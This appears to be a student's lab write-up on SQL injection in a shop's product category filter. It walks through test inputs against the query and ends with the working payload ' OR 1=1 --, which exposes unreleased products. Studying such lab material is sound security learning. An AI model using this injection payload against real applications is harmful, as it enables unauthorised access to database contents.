# lab1 : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

# SQL injection vulnerability in the product category filter
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

# End goal : display one or more unreleased products. 

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

SELECT * FROM products WHERE category = 'Pets' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1 
-->Internal Server Error

SELECT * FROM products WHERE category = ''--' AND released = 1 
--> after -- all are commented .and nothing is disply after this query run. and '-- is reflecting on the page.

# SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1 
--> payload = ' OR 1=1 --


